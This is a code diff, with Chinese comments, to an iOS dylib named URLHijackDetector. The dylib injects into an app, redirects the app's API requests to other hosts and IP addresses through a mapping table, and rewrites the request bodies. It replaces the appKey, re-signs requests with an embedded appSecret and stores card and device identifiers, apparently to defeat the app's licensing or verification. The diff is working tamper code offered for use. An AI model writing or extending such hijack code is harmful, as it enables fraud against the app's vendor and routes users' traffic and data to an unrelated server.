@@ -1,33 +1,43 @@
 // URLHijackDetector.m
-// iOS URL Hijack Dylib - 统一使用 params={}
+// iOS URL Hijack Dylib - 使用映射规则分别指定替换目标
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
 #import <CommonCrypto/CommonDigest.h>
 
 #pragma mark - 配置区
 
-// 需要处理的目标域名/IP
+// 替换映射规则：原始地址 -> 新地址
+// 支持域名/IP，支持带端口或不带端口
+static NSDictionary<NSString *, NSString *> *getRedirectMapping(void) {
+    return @{
+        // 域名替换为域名（不带端口）
+        @"api1.keyumjan.cn": @"api1.newdomain.com",
+        
+        // IP替换为IP（带端口）
+        @"45.205.27.82:8080": @"61.184.8.198:5563",
+        
+        // 可以继续添加更多映射，例如：
+        // @"api2.old.com": @"api2.new.com",
+        // @"192.168.1.100:9090": @"10.0.0.200:9090",
+        // @"api3.old.com:8080": @"api3.new.com:8080",
+    };
+}
+
+// 需要处理的目标域名/IP（自动从映射规则生成 + 固定目标）
 static NSSet<NSString *> *getTargetDomains(void) {
-    return [NSSet setWithArray:@[
+    NSMutableSet *domains = [NSMutableSet setWithArray:@[
         @"api1.7ccccccc.com",
         @"api2.7ccccccc.com", 
         @"api3.7ccccccc.com",
-        @"api1.keyumjan.cn",
-        @"45.205.27.82:8080"
     ]];
+    // 添加映射规则中的所有原始地址
+    [domains addObjectsFromArray:[getRedirectMapping() allKeys]];
+    return domains;
 }
 
-// 需要重定向的域名/IP列表（劫持后重定向到新域名）
+// 需要重定向的目标列表（直接从映射规则获取）
 static NSSet<NSString *> *getRedirectTargets(void) {
-    return [NSSet setWithArray:@[
-        @"45.205.27.82:8080",
-        @"api1.keyumjan.cn"
-    ]];
-}
-
-// 劫持后重定向的新域名
-static NSString *getNewDomain(void) {
-    return @"61.184.8.198:5563";
+    return [NSSet setWithArray:[getRedirectMapping() allKeys]];
 }
 
 // appSecret
@@ -205,8 +215,7 @@ static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *o
         saveParamsToStorage(card, deviceId);
     }
     
-    // ★★★ 关键修改：强制统一使用 params={} ★★★
-    // 不管原始请求中 params 是 %7B%7D 还是 {}，都统一替换为 {}
+    // ★★★ 强制统一使用 params={} ★★★
     if (params[@"params"]) {
         params[@"params"] = @"{}";
     }
@@ -227,13 +236,11 @@ static NSData* modifyRequestBodyForOriginalApi(NSData *originalBody, NSString *o
         if (newAppKey) {
             params[@"appKey"] = newAppKey;
             
-            // 重新计算签名（使用 params={}）
             NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
             if (newSign && newSign.length > 0) {
                 params[@"sign"] = newSign;
             }
             
-            // 构建新的请求体
             NSData *newBody = buildRequestBodyFromParams(params);
             if (newBody) {
                 return newBody;
@@ -277,7 +284,7 @@ static NSData* modifyRequestBodyForNewApi(NSData *originalBody, NSString *origin
     return originalBody;
 }
 
-#pragma mark - URL 匹配与替换
+#pragma mark - URL 匹配与替换（映射规则版）
 
 static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outHost, NSString **outPath) {
     NSURL *url = [NSURL URLWithString:originalURLString];
@@ -289,42 +296,38 @@ static NSString* replaceURLIfNeeded(NSString *originalURLString, NSString **outH
     if (outHost) *outHost = host;
     if (outPath) *outPath = url.path ?: @"";
     
-    BOOL needsRedirect = NO;
-    
-    for (NSString *target in getRedirectTargets()) {
-        if ([host isEqualToString:target]) {
-            needsRedirect = YES;
-            break;
-        }
-        
-        if (url.port) {
-            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
-            if ([hostWithPort isEqualToString:target]) {
-                needsRedirect = YES;
-                break;
-            }
-        }
+    // 构建带端口的 host（如果有）
+    NSString *hostWithPort = nil;
+    if (url.port) {
+        hostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
     }
     
-    if (needsRedirect) {
+    // 检查是否需要替换
+    NSString *newHost = nil;
+    NSDictionary *mapping = getRedirectMapping();
+    
+    // 优先匹配带端口的 host
+    if (hostWithPort && mapping[hostWithPort]) {
+        newHost = mapping[hostWithPort];
+    }
+    // 匹配不带端口的 host
+    else if (mapping[host]) {
+        newHost = mapping[host];
+    }
+    
+    if (newHost) {
         NSString *newURLString = originalURLString;
-        NSString *newDomain = getNewDomain();
         
-        if ([originalURLString hasPrefix:@"https://"]) {
-            newURLString = [newURLString stringByReplacingOccurrencesOfString:@"https://" 
-                                                                   withString:@"http://"];
-        }
-        
-        if (url.port) {
-            NSString *oldHostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
-            newURLString = [newURLString stringByReplacingOccurrencesOfString:oldHostWithPort 
-                                                                   withString:newDomain];
+        // 替换 host（优先替换带端口的完整字符串）
+        if (hostWithPort && mapping[hostWithPort]) {
+            newURLString = [newURLString stringByReplacingOccurrencesOfString:hostWithPort 
+                                                                   withString:newHost];
         } else {
             newURLString = [newURLString stringByReplacingOccurrencesOfString:host 
-                                                                   withString:newDomain];
+                                                                   withString:newHost];
         }
         
-        if (outHost) *outHost = newDomain;
+        if (outHost) *outHost = newHost;
         
         return newURLString;
     }
@@ -339,19 +342,17 @@ static BOOL isTargetRequest(NSString *urlString) {
     NSString *host = url.host;
     if (!host) return NO;
     
+    // 检查固定目标域名
     for (NSString *target in getTargetDomains()) {
         if ([host isEqualToString:target]) {
             return YES;
         }
     }
     
-    for (NSString *target in getRedirectTargets()) {
-        if ([host isEqualToString:target]) {
-            return YES;
-        }
-        
-        if (url.port) {
-            NSString *hostWithPort = [NSString stringWithFormat:@"%@:%@", host, url.port];
+    // 检查重定向目标（带端口）
+    if (url.port) {
+        NSString *hostWithPort = [NSString stringWithFormat:@"%@:%d", host, [url.port intValue]];
+        for (NSString *target in getRedirectTargets()) {
             if ([hostWithPort isEqualToString:target]) {
                 return YES;
             }
@@ -436,6 +437,7 @@ static BOOL isRedirectTarget(NSString *host) {
         NSString *host = nil;
         NSString *path = nil;
         
+        // 1. URL 替换（使用映射规则）
         NSString *newURLString = replaceURLIfNeeded(originalURLString, &host, &path);
         if (![newURLString isEqualToString:originalURLString]) {
             NSURL *newURL = [NSURL URLWithString:newURLString];
@@ -449,13 +451,14 @@ static BOOL isRedirectTarget(NSString *host) {
             path = url.path ?: @"";
         }
         
+        // 2. 修改请求体
         NSData *originalBody = request.HTTPBody;
         if (originalBody && host) {
             NSData *newBody = nil;
             
             if (isOriginalApiRequest(host)) {
                 newBody = modifyRequestBodyForOriginalApi(originalBody, originalURLString, request.HTTPMethod, host, path);
-            } else if (isRedirectTarget(host) || [host isEqualToString:getNewDomain()] || [host containsString:@"61.184.8.198"]) {
+            } else if (isRedirectTarget(host)) {
                 newBody = modifyRequestBodyForNewApi(originalBody, originalURLString);
             }
             
